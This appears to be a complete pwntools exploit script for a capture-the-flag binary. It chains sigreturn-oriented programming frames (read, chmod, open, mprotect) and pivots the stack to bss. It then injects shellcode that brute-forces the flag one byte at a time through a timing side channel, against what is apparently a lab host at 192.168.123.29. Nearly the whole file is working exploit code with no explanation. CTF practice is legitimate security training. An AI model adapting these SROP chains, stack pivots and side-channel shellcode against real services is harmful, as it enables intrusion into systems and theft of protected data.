# -*- coding=utf-8 -*-
#!/usr/bin/env python3
# A script for pwn exp
from pwnlib.adb.adb import shell
from pwn import *
import sys
import subprocess
import warnings
import os
import time

context(arch='amd64', os='Linux',
        binary="/home/kali/Desktop/srop_seccomp_side/dockerfile/bin/chall")


def init(binary):
    global arglen, elf, path, libc, context, io
    arglen = len(sys.argv)
    warnings.filterwarnings('ignore')
    context.terminal = ['gnome-terminal', '-x', 'bash', '-c']
    elf = ELF(binary)
    path = libcpath(binary)
    libc = ELF(path)
    libc.path = path
    context.arch = elfbit(binary)
    io = getprocess()


def s(data): return io.send(data)


def sa(rv, data): return io.sendafter(rv, data)
def sl(data): return io.sendline(data)


def sla(rv, data): return io.sendlineafter(rv, data)
def r(num): return io.recv(num)
def rl(keepends=True): return io.recvline(keepends)


def ru(data, drop=True, time=null): return io.recvuntil(
    data, drop) if time == null else io.recvuntil(data, drop, time)


def ia(): return io.interactive()


def l32(): return u32(ru(b'\xf7', False)[-4:].ljust(4, b'\x00'))
def l64(): return u64(ru(b'\x7f', False)[-6:].ljust(8, b'\x00'))
def uu32(data): return u32(data.ljust(4, b'\x00'))
def uu64(data): return u64(data.ljust(8, b'\x00'))
def i16(data): return int(data, 16)
def leak(name, addr): return log.success(
    '\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))


def info(data): return log.info(f'\033[36m{data}\033[0m')
def pau(): return pause() if DEBUG else null


def dbg(point=null): return (gdb.attach(io) if point ==
                             null else gdb.attach(io, f'b *{point}')) if DEBUG else null


def og(path=null): return list(map(int, subprocess.check_output(['one_gadget', '--raw', '-f', libc.path]).decode().strip('\n').split(
    ' '))) if path == null else list(map(int, subprocess.check_output(['one_gadget', '--raw', '-f', path]).decode().strip('\n').split(' ')))
def rg(binary, only, grep): return i16(subprocess.check_output(
    [f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"], shell=True).decode().split(' ')[0])


def setlibc(leak, func): return leak - libc.sym[func]


def elfbit(binary): return 'i386' if subprocess.check_output(
    ['file', binary]).decode().split(' ')[2] == '32-bit' else 'amd64'


def libcpath(binary): return subprocess.check_output(['ldd', binary]).decode().replace('	', '').split('\n')[1].split(
    ' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'], shell=True).decode().strip('\n').split('\n')[0]


def proce(binary, libc=null): return process(
    binary) if GLIBC else process(binary, env={'LD_PRELOAD': './'+libc})
def getprocess(): return proce(binary, path) if arglen == 1 else (remote(sys.argv[1].split(
    ':')[0], sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1], sys.argv[2]))


def clear(): return os.system('clear')


def li(x): return print('\x1b[01;38;5;214m' + x + '\x1b[0m')  # 彩色打印


# context.log_level='debug'
DEBUG = 1
GLIBC = 1
binary = '/home/kali/Desktop/srop_seccomp_side/dockerfile/bin/chall'
init(binary)

rop = ROP(elf)

# gadgets
mov_rax_0xf = 0x401193
leave_ret = 0x40136c
ret_addr = 0x401016
syscall_addr = rop.find_gadget(['syscall']).address
syscall_ret_addr = 0x401186  # full function

# rsi
data_addr = 0x404000
bss_addr = 0x404060


def pwn():
    global io
    flag_addr = 0x405000
    string = "0123456789-abcdefghijklmnopqrstuvwxyz"

    list = [ord(x) for x in string]
    flag = ""
    # rsp-> flag_addr

    index = 1

    while 1:
        for i in range(0x20):
            # io = process(binary)
            io = remote("192.168.123.29", 10003)
            loop_payload = '''
            mov rsp, {}
            mov dl,byte ptr [rsp+{}]
            mov cl,{}
            cmp dl,cl
            jnz $-0xf
            mov al, 0x3c
            syscall
            '''
            # diff -> loop -> timeout
            # same -> continue -> exit(EOF)
            # input("[Pause]")

            print("index1:", index)
            loop_payload = asm(loop_payload.format(
                flag_addr-0x1, index, list[i]))

            # init frame
            frame_read_1 = SigreturnFrame()
            frame_read_1.rax = 0
            frame_read_1.rdi = 0
            frame_read_1.rsi = data_addr
            frame_read_1.rdx = 0x5a
            frame_read_1.rsp = 0x404178  # 指向payload中邻接的mov_rax_0xf在bss段的地址
            frame_read_1.rip = syscall_ret_addr

            frame_chmod = SigreturnFrame()
            frame_chmod.rax = 0x5a
            frame_chmod.rdi = data_addr
            frame_chmod.rsi = 7
            frame_chmod.rsp = 0x404280  # 指向payload中邻接的mov_rax_0xf在bss段的地址
            frame_chmod.rip = syscall_ret_addr

            frame_open = SigreturnFrame()
            frame_open.rax = 0x02
            frame_open.rdi = data_addr
            frame_open.rsi = constants.O_RDONLY
            frame_open.rdx = 0
            frame_open.rsp = 0x404388  # 指向payload中邻接的mov_rax_0xf在bss段的地址
            frame_open.rip = syscall_ret_addr

            # read flag
            frame_read_2 = SigreturnFrame()
            frame_read_2.rax = 0
            frame_read_2.rdi = 3
            frame_read_2.rsi = 0x405000
            frame_read_2.rdx = 0x20
            frame_read_2.rsp = 0x404490  # 指向payload中邻接的mov_rax_0xf在bss段的地址
            frame_read_2.rip = syscall_ret_addr

            frame_mprotect = SigreturnFrame()
            frame_mprotect.rax = 0x0a
            frame_mprotect.rdi = 0x404000
            frame_mprotect.rsi = 0x1000
            frame_mprotect.rdx = 7
            frame_mprotect.rsp = 0x404598  # fream_read
            frame_mprotect.rip = syscall_ret_addr

            # read shellcode
            frame_read_3 = SigreturnFrame()
            frame_read_3.rax = 0
            frame_read_3.rdi = 0
            frame_read_3.rsi = 0x404a00  # shellcode_addr
            frame_read_3.rdx = 0x40
            frame_read_3.rsp = 0x404a00
            frame_read_3.rip = syscall_ret_addr

            # bss
            payload1 = p64(ret_addr) + p64(ret_addr)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_read_1)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_chmod)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_open)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_read_2)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_mprotect)
            payload1 += p64(mov_rax_0xf) + p64(syscall_addr)
            payload1 += bytes(frame_read_3)

            io.recvuntil(b'easyhack\n')
            io.send(payload1)

            # Stack Migration
            payload2 = b'a' * 42 + p64(bss_addr) + p64(leave_ret)
            io.recvuntil(b"Do u know what is SUID?\n")
            io.send(payload2)

            # 两次read，第一次读取flag，第二次读取shellcode
            io.send('./flag\x00'.ljust(0x5a, '\x00'))
            io.send(p64(ret_addr)+p64(0x404a10)+loop_payload)

            # input("[+] Press Enter to continue...")
            try:
                io.clean()
                io.recv(timeout=0.1)
            except EOFError as e:
                flag += chr(list[i])
                li(flag)  # [print flag]
                index = index + 1

                print("index2:", index)
                io.clean()
                io.close()
                break

            finally:
                io.close()


pwn()
ia()
